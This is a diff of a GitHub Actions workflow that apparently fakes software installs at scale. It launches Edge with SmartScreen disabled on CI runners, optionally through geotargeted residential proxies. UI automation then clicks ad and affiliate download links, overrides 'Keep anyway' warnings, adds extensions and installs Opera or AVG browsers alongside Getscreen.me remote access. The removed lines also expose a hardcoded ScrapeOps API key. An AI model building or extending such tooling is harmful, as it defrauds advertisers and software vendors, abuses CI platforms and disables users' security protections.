@@ -54,10 +54,10 @@ on:
           - 'Ad-MVN - A2Z'
         default: 'Ad-MVN - Techx'
       scrapeops_api_key:
-        description: 'ScrapeOps API Key (Proxy Password)'
-        required: true
+        description: 'ScrapeOps API Key (Proxy Password) — leave blank to run without proxy'
+        required: false
         type: string
-        default: '171bd4d6-baa1-4fb7-adee-7725d2fb00f2'
+        default: ''
       proxy_country:
         description: 'Proxy Country Geotargeting'
         required: true
@@ -117,6 +117,9 @@ jobs:
           mobile = os.environ.get("MOBILE", "false").lower() == "true"
           sticky = os.environ.get("STICKY", "false").lower() == "true"
           software_choice = os.environ.get("SOFTWARE_CHOICE", "AVG - B4Books")
+
+          # Determine if proxy should be used at all
+          use_proxy = bool(api_key)
 
           # Map Country to ScrapeOps codes
           country_map = {
@@ -207,19 +210,26 @@ jobs:
               for i in range(1, num_devices + 1):
                   device_name = f"{i}-{short_os_tag}-{short_sw_tag}"
 
-                  proxy_user = f"scrapeops.country={cc}"
-                  if mobile:
-                      proxy_user += ".mobile=true"
-                  if sticky:
-                      session_id = str(uuid.uuid4())[:8]
-                      proxy_user += f".sticky_session={session_id}"
+                  # Only build proxy credentials when an API key is provided
+                  if use_proxy:
+                      proxy_user = f"scrapeops.country={cc}"
+                      if mobile:
+                          proxy_user += ".mobile=true"
+                      if sticky:
+                          session_id = str(uuid.uuid4())[:8]
+                          proxy_user += f".sticky_session={session_id}"
+                      proxy_pass = api_key
+                  else:
+                      proxy_user = ""
+                      proxy_pass = ""
 
                   includes.append({
                       "device": device_name,
                       "email": email,
                       "os": os_version,
+                      "use_proxy": str(use_proxy).lower(),
                       "proxy_user": proxy_user,
-                      "proxy_pass": api_key,
+                      "proxy_pass": proxy_pass,
                       "target_url": target_url,
                       "software_type": software_type,
                       "exe_filter": exe_filter,
@@ -335,18 +345,26 @@ jobs:
           Start-Process msiexec.exe -Wait -ArgumentList $InstallArgs
           Write-Host "Getscreen.me is configured and running."
 
-      - name: Setup Proxied Auto-Downloader & Software Installation
+      - name: Setup Auto-Downloader & Software Installation
         shell: pwsh
         env:
+          USE_PROXY: ${{ matrix.use_proxy }}
           PROXY_USER: ${{ matrix.proxy_user }}
           PROXY_PASS: ${{ matrix.proxy_pass }}
           TARGET_URL: ${{ matrix.target_url }}
           SOFTWARE_TYPE: ${{ matrix.software_type }}
           EXE_FILTER: ${{ matrix.exe_filter }}
         run: |
+          $useProxy = $env:USE_PROXY -eq "true"
+
           Write-Host "============================================================" -ForegroundColor Cyan
-          Write-Host " Zero-Touch Proxy-Aware Downloader & Installer Active" -ForegroundColor Cyan
-          Write-Host " Category: $env:SOFTWARE_TYPE" -ForegroundColor Cyan
+          Write-Host " Zero-Touch Downloader & Installer Active" -ForegroundColor Cyan
+          Write-Host " Category  : $env:SOFTWARE_TYPE" -ForegroundColor Cyan
+          if ($useProxy) {
+              Write-Host " Mode      : Proxy-enabled" -ForegroundColor Cyan
+          } else {
+              Write-Host " Mode      : Direct (no proxy)" -ForegroundColor Yellow
+          }
           Write-Host "============================================================" -ForegroundColor Cyan
 
           # 1. Ensure Python dependencies are available
@@ -362,10 +380,6 @@ jobs:
 
           # ---------------------------------------------------------------
           # Window title fragments that identify "download done" pages.
-          # Covers all three cases shown in the screenshots:
-          #   Image 1 – Opera GX  : "Thanks for downloading Opera"  (opera.com)
-          #   Image 2 – Opera One : "Download | Thanks for downloadin" (opera.com)
-          #   Image 3 – AVG/sudetyj: "sudetyj.com/api/scripts/clickWorker"
           # ---------------------------------------------------------------
           DOWNLOAD_DONE_TITLES = [
               "Thanks for downloading Opera",
@@ -373,8 +387,8 @@ jobs:
               "Download | Thanks",
               "sudetyj",
               "clickWorker",
-              "GET READY TO PLAY",         # Opera GX page heading text (sometimes in title)
-              "ready to install",           # Opera One card heading
+              "GET READY TO PLAY",
+              "ready to install",
           ]
 
           def _is_download_done_window(text):
@@ -382,16 +396,8 @@ jobs:
               return any(frag.lower() in t for frag in DOWNLOAD_DONE_TITLES)
 
           def close_download_windows(desktop, attempt_label=""):
-              """
-              Three-strategy close for every leftover download/interstitial Edge window.
-              Strategy 1 : UIA 'Close' button
-              Strategy 2 : Alt+F4 keyboard shortcut
-              Strategy 3 : WM_CLOSE via ctypes PostMessageW
-              Returns True if at least one window was acted upon.
-              """
               WM_CLOSE = 0x0010
               closed_any = False
-
               try:
                   all_windows = desktop.windows(visible_only=True)
               except Exception:
@@ -405,8 +411,6 @@ jobs:
 
                       is_match = _is_download_done_window(wt)
 
-                      # For a generic "Microsoft Edge" / "Edge" top-level window,
-                      # inspect one level of children to detect the active tab title.
                       if not is_match and ("Microsoft Edge" in wt or wt == "Edge"):
                           try:
                               for child in window.children():
@@ -423,7 +427,6 @@ jobs:
                       print(f"[CloseWindow{attempt_label}] Target: '{wt}'")
                       closed = False
 
-                      # Strategy 1 – UIA Close button
                       if not closed:
                           try:
                               close_btns = window.descendants(control_type="Button", title="Close")
@@ -436,7 +439,6 @@ jobs:
                           except Exception:
                               pass
 
-                      # Strategy 2 – Alt+F4
                       if not closed:
                           try:
                               window.set_focus()
@@ -447,7 +449,6 @@ jobs:
                           except Exception:
                               pass
 
-                      # Strategy 3 – WM_CLOSE
                       if not closed:
                           try:
                               hwnd = window.handle
@@ -466,7 +467,7 @@ jobs:
 
               return closed_any
 
-          def handle_automation(username, password, software_type, timeout=360):
+          def handle_automation(username, password, software_type, use_proxy, timeout=360):
               desktop = Desktop(backend="uia")
               start_time = time.time()
               last_ctrl_j_time = time.time()
@@ -476,7 +477,6 @@ jobs:
               opera_launched_time = None
               opera_setup_completed = False
 
-              # Sentinel file written by PowerShell once the installer exe is found
               sentinel_path = os.path.join(tempfile.gettempdir(), "download_done.flag")
               download_windows_closed = False
 
@@ -495,11 +495,7 @@ jobs:
                               if "Microsoft Edge" not in wt and "Edge" not in wt and "Chrome Web Store" not in wt:
                                   opera_window = window
 
-                      # --------------------------------------------------
-                      # G. Close download/thanks/interstitial windows once
-                      #    the PowerShell job drops the sentinel file.
-                      #    Retry up to 5 times (2 s apart) to be robust.
-                      # --------------------------------------------------
+                      # G. Close download/thanks windows once sentinel file is written
                       if not download_windows_closed and os.path.exists(sentinel_path):
                           print("[CloseWindow] Sentinel detected — exe found. Starting download window cleanup...")
                           for attempt in range(1, 6):
@@ -510,13 +506,10 @@ jobs:
                                   break
                           download_windows_closed = True
                           print("[CloseWindow] Download window cleanup complete.")
-                          # Refresh window refs after closures
                           edge_window = None
 
-                      # --------------------------------------------------
-                      # A. Proxy Authentication dialog
-                      # --------------------------------------------------
-                      if edge_window or opera_window:
+                      # A. Proxy Authentication dialog — only when proxy is active
+                      if use_proxy and (edge_window or opera_window):
                           for w in [edge_window, opera_window]:
                               if w:
                                   user_fields = w.descendants(control_type="Edit", title="Username")
@@ -537,9 +530,7 @@ jobs:
                                       except Exception:
                                           pass
 
-                      # --------------------------------------------------
                       # B. Edge Download Protection: "Keep" & "Keep anyway"
-                      # --------------------------------------------------
                       if edge_window:
                           keep_btns = edge_window.descendants(control_type="Button", title="Keep")
                           if keep_btns:
@@ -553,11 +544,8 @@ jobs:
                               keep_anyway[0].click_input()
                               time.sleep(0.5)
 
-                      # --------------------------------------------------
                       # C. Interstitial & Final Download Auto-Clicker
-                      # --------------------------------------------------
                       if edge_window and software_type in ["opera_gx", "opera_one", "ad_mvn", "dynamic_opera"]:
-                          # 1. Cookie Popups
                           for cookie_btn in ["Accept all", "Accepter tout", "Tout accepter", "Accept Cookies", "Allow all", "Accept selection"]:
                               btns = edge_window.descendants(control_type="Button", title=cookie_btn)
                               if btns:
@@ -568,7 +556,6 @@ jobs:
                                   except:
                                       pass
 
-                          # 2. Main Download / Smart Link Clicks (Throttled to every 5 seconds)
                           if time.time() - last_dl_click_time > 5:
                               clicked_something = False
 
@@ -602,9 +589,7 @@ jobs:
                                                   except:
                                                       pass
 
-                      # --------------------------------------------------
-                      # D. Browser Extensions Handling (Add to Chrome / Edge)
-                      # --------------------------------------------------
+                      # D. Browser Extensions Handling
                       if edge_window:
                           add_ext_btns = edge_window.descendants(control_type="Button", title="Add extension")
                           if add_ext_btns:
@@ -630,9 +615,7 @@ jobs:
                                       except Exception:
                                           pass
 
-                      # --------------------------------------------------
                       # E. Ctrl+J to open downloads flyout
-                      # --------------------------------------------------
                       if not keep_clicked and edge_window and (time.time() - last_ctrl_j_time > 15) and ctrl_j_attempts < 4:
                           try:
                               edge_window.set_focus()
@@ -644,9 +627,7 @@ jobs:
                           except Exception:
                               pass
 
-                      # --------------------------------------------------
                       # F. Opera Post-install Keyboard Automation Flow
-                      # --------------------------------------------------
                       if software_type in ["opera_gx", "opera_one", "ad_mvn", "dynamic_opera"] and opera_window and not opera_setup_completed:
                           wt = opera_window.window_text()
 
@@ -734,37 +715,34 @@ jobs:
                   time.sleep(1)
 
           if __name__ == "__main__":
-              username = sys.argv[1] if len(sys.argv) > 1 else ""
-              password = sys.argv[2] if len(sys.argv) > 2 else ""
+              username    = sys.argv[1] if len(sys.argv) > 1 else ""
+              password    = sys.argv[2] if len(sys.argv) > 2 else ""
               software_type = sys.argv[3] if len(sys.argv) > 3 else "avg"
-              handle_automation(username, password, software_type)
+              # "true" or "false" string passed from PowerShell
+              use_proxy   = (sys.argv[4].lower() == "true") if len(sys.argv) > 4 else False
+              handle_automation(username, password, software_type, use_proxy)
           '@
 
           $handlerPy | Out-File -FilePath "$env:TEMP\auto_handler.py" -Encoding utf8
 
-          # Start the handler concurrently
-          if ($env:PROXY_PASS -ne "") {
-              Start-Process -FilePath "python" -ArgumentList "-u `"$env:TEMP\auto_handler.py`" `"$env:PROXY_USER`" `"$env:PROXY_PASS`" `"$env:SOFTWARE_TYPE`"" -WindowStyle Hidden
-          } else {
-              Start-Process -FilePath "python" -ArgumentList "-u `"$env:TEMP\auto_handler.py`" `"`" `"`" `"$env:SOFTWARE_TYPE`"" -WindowStyle Hidden
-          }
+          # Start the handler concurrently — always pass use_proxy as final arg
+          Start-Process -FilePath "python" `
+              -ArgumentList "-u `"$env:TEMP\auto_handler.py`" `"$env:PROXY_USER`" `"$env:PROXY_PASS`" `"$env:SOFTWARE_TYPE`" `"$env:USE_PROXY`"" `
+              -WindowStyle Hidden
 
-          # 3. Setup the Software Watcher/Installer background job (5.5 min timeout to fit within 6 min job limit)
-          $dlFolder = "$env:USERPROFILE\Downloads"
+          # 3. Setup the Software Watcher/Installer background job
+          $dlFolder    = "$env:USERPROFILE\Downloads"
           $timeoutSecs = 330
           $softwareType = $env:SOFTWARE_TYPE
-          $exeFilter = $env:EXE_FILTER
-          # Sentinel path — must match the path read inside auto_handler.py
+          $exeFilter   = $env:EXE_FILTER
           $sentinelPath = "$env:TEMP\download_done.flag"
 
           $installJob = Start-Job -ScriptBlock {
               param($dlFolder, $timeoutSecs, $softwareType, $exeFilter, $sentinelPath)
-              $deadline = (Get-Date).AddSeconds($timeoutSecs)
+              $deadline  = (Get-Date).AddSeconds($timeoutSecs)
               $installed = $false
 
               while (-not $installed -and (Get-Date) -lt $deadline) {
-
-                  # Find downloaded installer using dynamic filter
                   $candidates = Get-ChildItem -Path $dlFolder -Filter $exeFilter -ErrorAction SilentlyContinue |
                       Where-Object { $_.Name -notmatch '\.(crdownload|part|tmp)$' } |
                       Sort-Object LastWriteTime -Descending
@@ -773,11 +751,9 @@ jobs:
                       $file = $candidates[0]
                       Write-Output "[$softwareType] Download complete! ($($file.Name))"
 
-                      # Write sentinel so the Python UIA handler closes download windows
                       try { Set-Content -Path $sentinelPath -Value "done" -ErrorAction SilentlyContinue } catch {}
                       Write-Output "[$softwareType] Sentinel written — Python handler will close download windows."
 
-                      # Dynamically identify exact software installed for dynamic links
                       $actualSoftware = $softwareType
                       if ($softwareType -eq "ad_mvn" -or $softwareType -eq "dynamic_opera") {
                           if ($file.Name -match "OperaGX") {
@@ -789,7 +765,6 @@ jobs:
                           }
                       }
 
-                      # Wait until file is fully written / not locked
                       $locked = $true
                       while ($locked) {
                           Start-Sleep -Seconds 2
@@ -800,7 +775,6 @@ jobs:
                           } catch { }
                       }
 
-                      # Brief pause to let Python handler finish closing windows before installer pops up
                       Write-Output "[$actualSoftware] Waiting 4s for download window cleanup before launching installer..."
                       Start-Sleep -Seconds 4
 
@@ -833,7 +807,6 @@ jobs:
                               "C:\Program Files (x86)\Opera\opera.exe"
                           )
                       } else {
-                          # AVG paths
                           $appPaths = @(
                               "C:\Program Files\AVG\Browser\Application\AVGBrowser.exe",
                               "C:\Program Files (x86)\AVG\Browser\Application\AVGBrowser.exe",
@@ -868,15 +841,13 @@ jobs:
               }
           } -ArgumentList $dlFolder, $timeoutSecs, $softwareType, $exeFilter, $sentinelPath
 
-          # 4. Find Edge Path & Launch it
+          # 4. Find Edge Path & Build launch args
           $edgeExe = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
           if (-Not (Test-Path $edgeExe)) {
               $edgeExe = "C:\Program Files\Microsoft\Edge\Application\msedge.exe"
           }
 
-          $proxyServer = "residential-proxy.scrapeops.io:8181"
-
-          # CLI flags to suppress SmartScreen/download protection
+          # Base Edge flags (SmartScreen suppression, no first-run)
           $edgeArgs = @(
               "--no-first-run",
               "--no-default-browser-check",
@@ -885,12 +856,17 @@ jobs:
               "--disable-features=msSmartScreenProtection,SmartScreenPuaEnabled"
           )
 
-          if ($env:PROXY_PASS -ne "") {
+          # Only add proxy flag when a key was provided
+          if ($useProxy) {
+              $proxyServer = "residential-proxy.scrapeops.io:8181"
               $edgeArgs += "--proxy-server=`"http://$proxyServer`""
+              Write-Host "Launching Edge WITH proxy -> $env:TARGET_URL" -ForegroundColor Cyan
+          } else {
+              Write-Host "Launching Edge WITHOUT proxy (direct) -> $env:TARGET_URL" -ForegroundColor Yellow
           }
+
           $edgeArgs += "`"$env:TARGET_URL`""
 
-          Write-Host "Launching Edge with Proxy -> $env:TARGET_URL" -ForegroundColor Cyan
           Start-Process -FilePath $edgeExe -ArgumentList ($edgeArgs -join " ")
 
           # 5. Monitor Output of Background Job
